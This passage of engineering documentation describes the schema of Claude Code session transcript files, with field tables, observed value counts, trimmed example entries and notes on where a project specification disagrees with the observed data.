2. **Metadata entries** (`ai-title`, `custom-title`, `agent-name`, `last-prompt`, `queue-operation`, `mode`, `permission-mode`, `atis-latch`, `bridge-session`, `cost-state`, `frame-link`, `file-history-snapshot`, `file-history-delta`, `artifact-*`) carry only `type`, `sessionId` (absent on `file-history-*`) and their own fields. They have **no `uuid`, `timestamp` or `parentUuid`**, except `queue-operation`, `frame-link` and `file-history-delta`, which have `timestamp`.

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `type` | string | always | 19 top-level types in user data, 15 in probes (see below) | `system` and `attachment` add a subtype level |
| `uuid` | string (UUID) | always on conversation entries | | Preserved across `--fork-session` (see Fork) |
| `parentUuid` | string \| null | always on conversation entries | null on first entry and on `compact_boundary` | Chain order ≠ file order |
| `timestamp` | string ISO-8601 ms `Z` | always on conversation entries | | |
| `sessionId` | string (UUID) | always (except file-history-*) | Subagent entries carry the **parent's** sessionId | |
| `isSidechain` | bool | always on conversation entries | main: false 5643/5643; subagent + workflow files: true 3243/3243 (user data) | |
| `agentId` | string | sometimes | on every entry of subagent files | |
| `cwd` | string | always on conversation entries | raw path | |
| `version` | string | always on conversation entries | `2.1.270` | |
| `gitBranch` | string | always on conversation entries | `HEAD` (non-git dir) | |
| `entrypoint` | string | always on conversation entries | `cli` (interactive), `sdk-cli` (`-p`) | Distinguishes interactive from print mode |
| `userType` | string | always on conversation entries | `external` | |
| `slug` | string | sometimes | e.g. `zesty-splashing-lightning` | A random 3-word session nickname. It appears after compaction and on some interactive entries. **Not** the project dir slug |
| `session_id` | string | sometimes | equal to `sessionId` (11/11 in interactive probe) | Seen on interactive (`cli`) sessions |

**Entry type counts** (`docs/probes/2026-09-14-schemas/transcripts/captures/real-transcripts-stats.json`: snapshot at the time in `docs/probes/2026-09-14-schemas/transcripts/captures/real-transcripts-stats.generated_at.txt`. User dirs = 12,270 entries in 14 main + 26 agent files. The counts drift because live sessions keep writing. Probe dirs = all `-tmp-shp-*` throwaways, including sibling probes):
`assistant` 4345 · `user` 2477 · `attachment` (27 subtypes) 1,789 · `queue-operation` 462 · `last-prompt` 443 · `mode` 425 · `permission-mode` 425 · `bridge-session` 406 · `agent-name` 264 · `custom-title` 264 · `system/turn_duration` 217 · `file-history-snapshot` 217 · `atis-latch` 182 · `ai-title` 167 · `frame-link` 55 · `file-history-delta` 49 · `system/stop_hook_summary` 39 · `artifact-autoreact-ledger` 14 · `system/bridge_status` 8 · `cost-state` 7 · `system/local_command` 6 · `artifact-comment-monitor` 4 · `system/compact_boundary` 3 · `system/away_summary` 1 · `system/informational` 1. **`summary` 0 · `pr-link` 0.** Malformed lines: 0.

**Variants and edge cases:**
- Only 56% of entries (6,822 of 12,270) are `user` or `assistant`. The rest are metadata and attachments. `attachment/prompt_snapshot` entries embed the full system prompt and tool list, so a one-turn `-p` session is about 167 KB.
- Metadata entries are **re-appended** repeatedly, after every turn and on resume. Observed in the probe: the same `ai-title` appeared at lines 0, 16, 26 and 49 of one file. The binary's merge-policy table marks `ai-title`, `custom-title`, `agent-name`, `summary`, `pr-link`, `mode`, `permission-mode` and `bridge-session` as `last-wins`, `last-prompt` and `file-history-*` as `boundary-cleared`, and `frame-link` as `accumulate` (`docs/probes/2026-09-14-schemas/transcripts/captures/binary-metadata-table.txt`). **Readers must take the last occurrence.** The same table names types never observed here: `continued-in`, `fork-context-ref`, `content-replacement`, `ended-by-model`, `tag`, `relocated`, `agent-color`, `agent-setting`, `history-suppression`, `attribution-snapshot`, `marble-origami-*`.
- A metadata entry can appear **before** the first `user` entry: `ai-title` at line 0 (`0141fab3…jsonl`), `custom-title` at line 0 (`8b86e691…jsonl`).

**Spec alignment:** line 1022 says the verdict model reads the "last ~20 entries". In the user data, 44% of entries (5,448 of 12,270) are neither `user` nor `assistant`: 27.6% are metadata-only types, 14.6% are attachments and 2.2% are `system`. Some attachments are the size of a system prompt. Metadata is also re-appended at turn end, so it clusters in the tail. In the 15 copied throwaway main transcripts, the last 20 lines hold only 2 to 9 `user`/`assistant` entries. The tail must filter by `type` before counting (`docs/probes/2026-09-14-schemas/transcripts/captures/real-transcripts-stats.json`, `docs/probes/2026-09-14-schemas/transcripts/copies/*/*.jsonl`).

### Transcript entry: `assistant`

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §7 `session.model` / `effort` (line 666), §8 classifier, §12 fleet row "opus-5", D24, M1/M2
- **Probe:** `docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh` (steps `main effort`). Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh main effort`
- **Status:** partially verified. The haiku envelope was verified live 2026-09-14. Top-level `effort` was seen only on a sonnet throwaway copied from the sibling hooks probe (`docs/probes/2026-09-14-schemas/transcripts/captures/effort-copy-provenance.txt`). No opus throwaway was run; opus values come from user-data counts only.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` line 19)
```json
{"parentUuid":"5c71260f-85e3-4541-ae9f-1b28b3903b6a","isSidechain":false,"message":{"model":"claude-haiku-4-5-20251001","id":"msg_011Cf3YJjCUY6gKrhVLBVgC4","type":"message","role":"assistant","content":[{"type":"tool_use","id":"toolu_01AjU2TvSydb1THCnRCcYCLQ","name":"Agent","input":{"description":"probe child","subagent_type":"general-purpose","prompt":"Reply with exactly the word PONG and nothing else."},"caller":{"type":"direct"}}],"container":null,"stop_reason":"tool_use","stop_sequence":null,"stop_details":null,"usage":{"input_tokens":10,"cache_creation_input_tokens":7853,"cache_read_input_tokens":13607,"output_tokens":406,"output_tokens_details":{"thinking_tokens":229},"server_tool_use":{"web_search_requests":0,"web_fetch_requests":0},"service_tier":"standard","cache_creation":{"ephemeral_1h_input_tokens":7853,"ephemeral_5m_input_tokens":0},"inference_geo":"not_available","iterations":[...],"speed":"standard"},"diagnostics":null,"context_management":null},"wireToolInputs":{...},"apiBlockIndex":1,"requestId":"req_011Cf3YJiZXWo9S8uYzXXRb7","type":"assistant","uuid":"25575054-0003-4bfa-8fd3-ffb3adeb823c","timestamp":"2026-09-14T15:07:11.965Z","perTurnEffort":null,"userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-tx.blIf90/work","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","version":"2.1.270","gitBranch":"HEAD"}
```
With top-level `effort` (sonnet throwaway; full capture: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-hooks-effort-7yb7myuc/5c59934b-3bd1-43ab-9506-a6a16f581034.jsonl` line 24):
```json
{"parentUuid":"9990e296-2225-43ed-9048-f40119d9f202","isSidechain":false,"message":{"model":"claude-sonnet-5","id":"msg_011Cf3ZGdVyrLrVns9PKFoK8","type":"message","role":"assistant","content":[{"type":"text","text":"DONE"}],"container":null,"stop_reason":"end_turn",...},"apiBlockIndex":0,"requestId":"req_011Cf3ZGcvzzThSm4f1HAaoP","type":"assistant","uuid":"6ba36219-5dca-4e65-a026-bafd34cd2509","timestamp":"2026-09-14T15:19:47.452Z","effort":"low","perTurnEffort":null,"userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-hooks-effort-7yb7myuc","sessionId":"5c59934b-3bd1-43ab-9506-a6a16f581034","version":"2.1.270","gitBranch":"HEAD"}
```

| Field | Type | Presence (user data, n=4345) | Observed values | Notes |
|---|---|---|---|---|
| `message.model` | string | always | `claude-opus-5` 4331, `claude-sonnet-5` 9, `<synthetic>` 5; probes add `claude-haiku-4-5-20251001` | Full model id, not an alias |
| `message.id` | string | always | `msg_…`; a UUID on `<synthetic>` | **One API message is split across several entries**, one per content block (same `message.id` and `requestId`, increasing `apiBlockIndex`, `usage` repeated) |
| `message.content[]` | array | always | exactly 1 block per entry: `thinking` \| `text` \| `tool_use` | `thinking.thinking` is `""` (signature only) |
| `message.stop_reason` | string \| null | always | `tool_use` 3333, `end_turn` 305, null 702, `stop_sequence` 5 | null on non-final blocks of interactive streams |
| `message.usage.{input_tokens, output_tokens, cache_creation_input_tokens, cache_read_input_tokens, cache_creation, service_tier, inference_geo}` | numbers / object / string | always (4345) | | Repeated on each block of one message. Summing per entry overcounts |
| `message.usage.{iterations, server_tool_use, speed}` | array / object / string | sometimes (3643) | | null or absent on `<synthetic>` |
| `message.usage.output_tokens_details` | object | sometimes (1574) | `{"thinking_tokens":N}` | |
| `effort` | string | sometimes (4340/4345 user, **0/319 haiku entries in probe dirs**) | `high` 4307, `medium` 33; probe dirs `high` 10, `low` 4 (all 14 on `claude-sonnet-5`) | **Top-level. Absent on haiku even with `--effort low`** (`docs/probes/2026-09-14-schemas/transcripts/captures/effort-meta.txt`) and absent on `<synthetic>` |
| `perTurnEffort` | null | sometimes (2273) | always `null` observed | Separate from `effort` |
| `requestId` | string | almost always (4343) | `req_…` | |
| `apiBlockIndex` | number | sometimes (2273) | 0,1,2… | |
| `wireToolInputs` | object | sometimes (1099) | map tool_use id → input | |
| `attributionAgent` / `attributionSkill` / `attributionPlugin` / `attributionMcpServer` / `attributionMcpTool` | string | sometimes (1417/863/288/33/33) | `<redacted>` | On subagent and skill-driven entries |
| `error`, `isApiErrorMessage`, `apiErrorStatus` | string / bool / number | sometimes (4/5/3) | see `<synthetic>` | |
| `isAbortedMidStream` | bool | sometimes (1) | | |

**Variants and edge cases:** per-block splitting means "the last assistant entry" can be a lone `thinking` block. To get the final text, group by `message.id`.

**Spec alignment:** line 666 says "`effort` is a top-level transcript field; `model` is at `message.model`". This is aligned for opus and sonnet. For haiku, top-level `effort` is **never written**, even when `--effort low` is passed (`docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/667257d2-9430-4714-a8b1-fb07a95ae0bf.jsonl`), so `session.effort` must stay nullable. `message.model` can be `<synthetic>`, which is not a model.

### Transcript entry: `<synthetic>` assistant

- **Produced by:** Claude Code 2.1.270 (client-side, no API call)
- **Consumed by:** §8 mechanical stop reasons (`rate_limit`, `auth_failed`), §7 `session.model`, D24, M2
- **Probe:** `docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh` step `synthetic` (unknown model) and `docs/probes/2026-09-14-schemas/transcripts/probe_fork_live.sh` (fork of a mid-turn session). Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh synthetic`
- **Status:** verified live 2026-09-14 (`model_not_found`, fork filler). `rate_limit` and `authentication_failed` counted in user data only.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/89b8683f-b2ea-4874-934a-9cadbb6cb276.jsonl` line 16)
```json
{"parentUuid":"d409bb38-1d39-4161-b040-f1b1c1e28d1a","isSidechain":false,"type":"assistant","uuid":"eb2fa9c6-7eae-4d94-a71a-58b1d9b082ed","timestamp":"2026-09-14T15:09:10.052Z","message":{"diagnostics":null,"id":"9e60ee5c-53b6-4dd6-a771-1e90f7bb3c8c","container":null,"model":"<synthetic>","role":"assistant","stop_details":null,"stop_reason":"stop_sequence","stop_sequence":"","type":"message","usage":{"output_tokens_details":null,"input_tokens":0,"output_tokens":0,"cache_creation_input_tokens":0,"cache_read_input_tokens":0,"server_tool_use":{"web_search_requests":0,"web_fetch_requests":0},"service_tier":null,"cache_creation":{"ephemeral_1h_input_tokens":0,"ephemeral_5m_input_tokens":0},"inference_geo":null,"iterations":null,"speed":null},"content":[{"type":"text","text":"There's an issue with the selected model (claude-nonexistent..."}],"context_management":null},"requestId":"req_011Cf3YTfcB998zosz95sFUe","error":"model_not_found","isApiErrorMessage":true,"apiErrorStatus":404,"userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-tx.blIf90/work","sessionId":"89b8683f-b2ea-4874-934a-9cadbb6cb276","version":"2.1.270","gitBranch":"HEAD"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `message.model` | string | always | `<synthetic>` | |
| `message.stop_reason` | string | always | `stop_sequence` | |
| `message.usage.*` | numbers | always | all 0 | |
| `error` | string \| absent | sometimes | `model_not_found` (probe), `rate_limit` 3, `authentication_failed` 1 (user data) | Machine-readable. Use this, not the text |
| `isApiErrorMessage` | bool | always on synthetic | true (API errors), false (fork filler "No response requested.") | |
| `apiErrorStatus` | number \| null | sometimes | 404 (probe), numbers ×3 in user data | |
| `effort`, `perTurnEffort`, `apiBlockIndex` | — | never | | |

**Variants and edge cases:** a fork of a mid-turn session synthesizes `"No response requested."` with `isApiErrorMessage:false` (see Fork). A classifier must not treat every `<synthetic>` entry as an error.

**Spec alignment:** aligned with §8's claim that mechanical reasons are machine-readable, since `error` carries `rate_limit` and `authentication_failed`. The spec does not name the `<synthetic>` marker or the `error` field.

### Transcript entry: `user`

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §7 `brief` (line 664), §8 classifier, M1/M2
- **Probe:** `docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh` (`main bg`). Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh main bg`
- **Status:** verified live 2026-09-14

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` lines 20 and 33)
```json
{"parentUuid":"25575054-0003-4bfa-8fd3-ffb3adeb823c","isSidechain":false,"promptId":"b842cda1-7298-40d9-87a4-1966249ed00c","type":"user","message":{"role":"user","content":[{"tool_use_id":"toolu_01AjU2TvSydb1THCnRCcYCLQ","type":"tool_result","content":[{"type":"text","text":"Async agent launched successfully. (This tool result is internal metad..."}]}]},"uuid":"3395f91e-c746-414a-996f-bac590870388","timestamp":"2026-09-14T15:07:12.340Z","toolUseResult":{"isAsync":true,"status":"async_launched","agentId":"a4388d337bf8a9397","description":"probe child","resolvedModel":"claude-haiku-4-5-20251001","prompt":"Reply with exactly the word PONG and nothing else.","outputFile":"/tmp/claude-0/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-...","canReadOutputFile":true},"sourceToolAssistantUUID":"25575054-0003-4bfa-8fd3-ffb3adeb823c","userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-tx.blIf90/work","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","version":"2.1.270","gitBranch":"HEAD"}
{"parentUuid":"9958eb57-0222-46a6-825c-27cd9fefb2b9","isSidechain":false,"promptId":"b522145f-c441-4adf-b34c-aed11dc38f4d","type":"user","message":{"role":"user","content":"<task-notification>\n<task-id>a4388d337bf8a9397</task-id>\n<tool-use-i..."},"uuid":"f0e5636b-fcf9-4060-b62d-74fa7ae27e4d","timestamp":"2026-09-14T15:07:15.932Z","permissionMode":"default","origin":{"kind":"task-notification"},"promptSource":"sdk","queueSkipAttachments":true,"userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-tx.blIf90/work","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","version":"2.1.270","gitBranch":"HEAD"}
```

| Field | Type | Presence (user data, n=2477) | Observed values | Notes |
|---|---|---|---|---|
| `message.content` | string \| array | always | string (prompt, task-notification, compact summary) or `[tool_result]` / `[text]` | |
| `promptId` | string | always | | Shared by every entry of one turn. Also present in hook payloads |
| `toolUseResult` | object \| string | sometimes (1601) | Agent async: `{isAsync,status:"async_launched",agentId,…}`; Workflow: `{status:"async_launched",taskId,taskType:"local_workflow",runId,transcriptDir,scriptPath,…}`; string on interruption | Tool-specific |
| `sourceToolAssistantUUID` | string | sometimes (2174) | | Links a tool_result to its assistant entry |
| `origin.kind` | string | sometimes (226) | `human` 212, `task-notification` 10, `coordinator` 2, `peer` 2 | Only on prompt-type user entries |
| `promptSource` | string | sometimes (230) | `queued` 192, `typed` 20, `system` 11, `sdk` 7 | |
| `permissionMode` | string | sometimes (230) | | |
| `isCompactSummary`, `isVisibleInTranscriptOnly` | bool | sometimes (3/3) | true | Compaction |
| `isMeta` | bool | sometimes (31) | | e.g. fork filler "Continue from where you left off." |
| `toolDenialKind` | string | sometimes (19) | `interrupted` (probe) | |
| `interruptedMessageId`, `queueSkipAttachments`, `classifierMetaLines`, `mcpMeta`, `sourceToolUseID`, `toolEndsTurn`, `turnCompanion` | various | sometimes (5/9/54/10/11/15/10) | `<redacted>` | Not probed individually |

**Variants and edge cases:** a background-agent completion is a `user` entry whose `content` is a `<task-notification>` string (see queue-operation). Only `origin.kind` separates it from a human prompt.

**Spec alignment:** see `last-prompt` for `brief`.

### Transcript entry: `attachment`

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §8 transcript tail (line 1022) as noise to filter; nothing in the spec consumes attachments. M2
- **Probe:** `probe_lifecycle.sh main`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh main`
- **Status:** partially verified. The envelope and the `model`, `environment` and `prompt_snapshot` subtypes were verified live 2026-09-14. This surface's copies contain 11 subtypes, all `-tmp-shp-*` probe dirs contain 20, and 31 distinct subtypes appear once user data is included. The rest are counted from user data only.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` line 5)
```json
{"parentUuid":"64b6acc0-a884-46f6-9432-7d88e55d8778","isSidechain":false,"attachment":{"type":"model","identity":{"modelId":"claude-haiku-4-5-20251001","marketingName":"Haiku 4.5","knowledgeCutoff":"February 2025"},"text":"You are powered by the model named Haiku 4.5. The exact model ID is cl..."},"type":"attachment","uuid":"9746158c-8690-4d9c-95f5-dbcc12a7d9d4","timestamp":"2026-09-14T15:07:08.156Z","rendered":[{"content":"<system-reminder>\nYou are powered by the model named Haiku 4.5. The e..."}],"userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-tx.blIf90/work","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","version":"2.1.270","gitBranch":"HEAD"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `attachment.type` | string | always | user data: `total_tokens_reminder` 1101, `task_reminder` 149, `prompt_snapshot` 80, `environment` 48, `remote_session_change` 44, `date` 44, `model` 43, `session_context` 40, `skill_listing` 40, `deferred_tools_delta` 39, `auto_mode` 27, `edited_text_file` 24, `agent_listing_delta` 21, `queued_command` 17, `structured_output` 15, `command_permissions` 11, `compact_file_reference` 8, `date_change` 8, `deferred_tools_record` 7, `file` 4, `silent_turn_reminder` 4, `hook_additional_context` 3, `hook_success` 3, `invoked_skills` 3, `mcp_instructions_delta` 3, `read_truncation_notice` 2, `hook_system_message` 1; probes add `hook_cancelled`, `hook_non_blocking_error`, `instructions`, `plan_mode` | |
| `attachment.*` | object | always | `model`: `{identity{modelId,marketingName,knowledgeCutoff},text}`; `environment`: `{snapshot{workingDirectory,isWorktree,isGitRepo,additionalWorkingDirectories,platform,shell,osVersion}}`; `prompt_snapshot`: `{systemPrompt[],tools[],cliPrefix}` | Per-subtype |
| `rendered` | array | sometimes (absent on `prompt_snapshot`) | `[{content:"<system-reminder>…"}]` | |

**Variants and edge cases:** `session_context` holds the **account email** and `bridge-session` holds account and org UUIDs. Anything that copies or displays transcripts must redact them (§13).

**Spec alignment:** not described in the spec. The spec's "never return a raw transcript entry to the browser" rule (line 2107) covers this.

### Transcript entry: `system` (stop_hook_summary, turn_duration, others)

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §8 stop classification (turn boundaries), M2
- **Probe:** `probe_lifecycle.sh main` (stop_hook_summary) and `docs/probes/2026-09-14-schemas/transcripts/probe_registry_interactive.sh` (turn_duration). Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_registry_interactive.sh`
- **Status:** partially verified. `stop_hook_summary`, `turn_duration`, `compact_boundary` and `local_command` were verified live 2026-09-14. `away_summary`, `bridge_status` and `informational` are counted in user data only.

**Real example** (trimmed; full captures: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` line 31, `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-regint-KD6xG3-work/2efd1f5f-1b93-481a-8469-0f589a48d7ae.jsonl` line 39)
```json
{"parentUuid":"6c5c2237-9ae3-4878-8070-03683a9bb2b1","isSidechain":false,"type":"system","subtype":"stop_hook_summary","hookCount":1,"hookInfos":[{"command":"python3 /root/Shepherd/docs/probes/2026-09-14-schemas/transcripts/hook...","durationMs":161}],"hookErrors":[],"hookAdditionalContext":[],"preventedContinuation":false,"stopReason":"","hasOutput":false,"level":"suggestion","timestamp":"2026-09-14T15:07:15.925Z","uuid":"9958eb57-0222-46a6-825c-27cd9fefb2b9","toolUseID":"74fb939e-c2f2-4f5b-aad4-0b2ae06bc66f","userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-tx.blIf90/work","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","version":"2.1.270","gitBranch":"HEAD"}
{"parentUuid":"fc761860-8b74-4b7b-bef9-888d793459cc","isSidechain":false,"type":"system","subtype":"turn_duration","durationMs":22830,"messageCount":18,"timestamp":"2026-09-14T15:16:40.423Z","uuid":"8d8429e4-9335-414d-8b7f-c78da28eab22","isMeta":false,"userType":"external","entrypoint":"cli","cwd":"/tmp/shp-schemas-regint.KD6xG3/work","sessionId":"2efd1f5f-1b93-481a-8469-0f589a48d7ae","version":"2.1.270","gitBranch":"HEAD"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `subtype` | string | always | `turn_duration` 217, `stop_hook_summary` 39, `local_command` 6, `bridge_status` 8, `compact_boundary` 3, `away_summary` 1, `informational` 1 | |
| `stop_hook_summary.{hookCount,hookInfos[{command,durationMs}],hookErrors,hookAdditionalContext,preventedContinuation,stopReason,hasOutput,level,toolUseID}` | mixed | always on that subtype | `level: suggestion` | Written **only when a Stop hook is configured**. In `-p` runs it is the turn-end marker |
| `turn_duration.{durationMs,messageCount,isMeta}` | numbers / bool | always on that subtype | | **Written by interactive (`cli`) sessions only.** None was written by a `-p` run. A `-p` fork copies the target's `turn_duration` entries with `entrypoint` rewritten to `sdk-cli`, and the uuid stays the same as in the target (`docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-fork-*`) |
| `turn_duration.pendingBackgroundAgentCount` / `pendingWorkflowCount` | number | sometimes (6/2 of 217) | `<number>` | A turn can end while agents are still running |
| `level` | string | sometimes | `suggestion`, `info` | |

**Variants and edge cases:** the turn-end marker depends on the entrypoint. Interactive sessions write `turn_duration`. Print-mode sessions write nothing unless a Stop hook exists.

**Spec alignment:** not described in the spec. §8 relies on the `Stop` hook for turn ends, which is consistent.

### Compaction entries (`system/compact_boundary` + compact summary `user`)

- **Produced by:** Claude Code 2.1.270 (`/compact`)
- **Consumed by:** §8 `context_exhausted` (line 966), §8 transcript tail, `shepherd recompute`, M2
- **Probe:** `probe_lifecycle.sh compact`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh main compact`
- **Status:** verified live 2026-09-14 (manual trigger). `auto` trigger counted once in user data only.

**Real example** (trimmed; full capture: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` lines 52 and 53)
```json
{"parentUuid":null,"logicalParentUuid":"b64bcef1-3451-4327-95f4-6bdeab16ec77","isSidechain":false,"type":"system","subtype":"compact_boundary","content":"Conversation compacted","isMeta":false,"timestamp":"2026-09-14T15:09:06.987Z","uuid":"6568005a-8565-49b6-8724-2d1d7f37e81b","level":"info","compactMetadata":{"trigger":"manual","preTokens":23010,"durationMs":17516,"preservedSegment":{"headUuid":"b92cb616-7df8-4b00-9021-8cdb2d42b86a","anchorUuid":"469d71ee-11a6-44bd-bca6-64295b2ed4fb","tailUuid":"a0f601a0-f071-4fc6-b3fa-969600f80e5c"},"preservedMessages":{"anchorUuid":"469d71ee-11a6-44bd-bca6-64295b2ed4fb","uuids":[...],"allUuids":[...]},"postTokens":1873,"cumulativeDroppedTokens":21137},"userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-tx.blIf90/work","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","version":"2.1.270","gitBranch":"HEAD","slug":"zesty-splashing-lightning"}
{"parentUuid":"6568005a-8565-49b6-8724-2d1d7f37e81b","isSidechain":false,"promptId":"8be54374-8f32-46f9-9fe2-1378da857b9f","type":"user","message":{"role":"user","content":"This session is being continued from a previous conversation..."},"isVisibleInTranscriptOnly":true,"isCompactSummary":true,"uuid":"469d71ee-11a6-44bd-bca6-64295b2ed4fb","timestamp":"2026-09-14T15:09:06.985Z","userType":"external","entrypoint":"sdk-cli","cwd":"/tmp/shp-schemas-tx.blIf90/work","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d","version":"2.1.270","gitBranch":"HEAD","slug":"zesty-splashing-lightning"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `parentUuid` | null | always | null | Chain restarts. `logicalParentUuid` points to the pre-compaction leaf |
| `compactMetadata.trigger` | string | always | `manual` (2 user + 2 probe), `auto` (1 user) | |
| `compactMetadata.{preTokens,postTokens,durationMs,cumulativeDroppedTokens}` | number | always (3/3) | | |
| `compactMetadata.{preservedSegment,preservedMessages}` | object | always (3/3) | uuids | |
| `compactMetadata.preCompactDiscoveredTools` | array | sometimes (2/3) | | |
| summary `user.isCompactSummary` | bool | always right after the boundary | true | Content starts "This session is being continued from a previous conversation" |

**Variants and edge cases:** compaction happens **in the same file with the same sessionId** (probe: `0141fab3…` went from 47 to 63 lines). No `summary`-type entry was written by `/compact`, and the user data has 0 of them. The hook side showed `SessionStart` with `source:"compact"` between `PreCompact` and `PostCompact` (`docs/probes/2026-09-14-schemas/transcripts/captures/hooks-lifecycle.jsonl`).

**Spec alignment:** aligned. §8 uses `PreCompact{auto}` and the transcript carries a matching `compactMetadata.trigger`.

### Title and name entries: `ai-title`, `custom-title`, `agent-name` (title sources)

- **Produced by:** Claude Code 2.1.270
- **Consumed by:** §7.1 title / `title_source` (lines 700–736), D29, §18 title write-back probe, M1 (engine title), M3 (rename)
- **Probe:** `probe_lifecycle.sh main named` and `docs/probes/2026-09-14-schemas/transcripts/probe_registry_interactive.sh`. Re-run: `bash docs/probes/2026-09-14-schemas/transcripts/probe_lifecycle.sh main named`
- **Status:** verified live 2026-09-14 for `ai-title` (unnamed session) and for `custom-title` + `agent-name` (`--name`). What `/rename` writes is out of scope here (tmux surface).

**Real example** (full captures: `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/0141fab3-8bf8-4b69-be1f-89552ccfce5d.jsonl` line 0; `docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/8b86e691-5e1a-46b3-9bc0-bc7dc694abb3.jsonl` lines 0–1)
```json
{"type":"ai-title","aiTitle":"Agent probe and notes","sessionId":"0141fab3-8bf8-4b69-be1f-89552ccfce5d"}
{"type":"custom-title","customTitle":"shp probe named","sessionId":"8b86e691-5e1a-46b3-9bc0-bc7dc694abb3"}
{"type":"agent-name","agentName":"shp probe named","sessionId":"8b86e691-5e1a-46b3-9bc0-bc7dc694abb3"}
```

| Field | Type | Presence | Observed values | Notes |
|---|---|---|---|---|
| `aiTitle` | string | always on `ai-title` | "Agent probe and notes", "Probe prompt truncation test" | Generated by Claude Code |
| `customTitle` | string | always on `custom-title` | the `--name` value | |
| `agentName` | string | always on `agent-name` | same value as `customTitle` in every observation (264 = 264 in user data) | |
| per main file | — | — | user data (14 files): ai-title only 12, custom-title + agent-name only 1, all three 1. Probe dirs: ai-title only 54, custom + agent-name only 4, none 25 | |

**Title sources, observed:**
- **Unnamed session** (`-p` or interactive): `ai-title` is written during the first turn and re-appended after later turns. In file order it can come before the first `user` entry (line 0 of `0141fab3…`). One-shot "Reply with exactly OK." sessions got one too (all 9 slug-probe sessions).
- **`--name "<n>"`** (`-p` or interactive): `custom-title` + `agent-name` are written at line 0, **and no `ai-title` is generated** (`8b86e691…`, `2efd1f5f…`). The hooks `SessionStart` and `UserPromptSubmit` carry `session_title: "<n>"`. The registry file has `name` and `nameSource:"user"`.
- **`/rename`** writes the sidecar `<sessionId>/custom-title.json` `{"customTitle": …}` (1 user file; tmux surface).
- User interactive sessions launched with `--remote-control <name>` show `nameSource:"derived"` in the registry (`docs/probes/2026-09-14-schemas/transcripts/captures/registry-stats.json`).
- The session that failed before any model reply (`89b8683f…`, model_not_found) wrote **no title**. 25 probe-dir transcripts have no title entry at all; they are mostly other surfaces' probes and were not examined individually.

**Spec alignment:**
- spec line 713–714 says "Claude Code writes `ai-title` entries … so a generated title arrives for free, including for `attached` sessions". In reality a session started with `--name` gets `custom-title` + `agent-name` and **no** `ai-title`. This held for both named throwaways: `-p` `8b86e691…` and interactive `2efd1f5f…`. In user data, 1 of the 2 main files that have `custom-title` also has no `ai-title`; the other has all three (`docs/probes/2026-09-14-schemas/transcripts/copies/-tmp-shp-schemas-tx-blIf90-work/8b86e691-5e1a-46b3-9bc0-bc7dc694abb3.jsonl`, `docs/probes/2026-09-14-schemas/transcripts/captures/real-transcripts-stats.json`). Unnamed sessions, attached ones included, do get `ai-title`. The spec never mentions `custom-title`, which is Claude Code's user-title channel. It should map to a title source rather than being ignored.
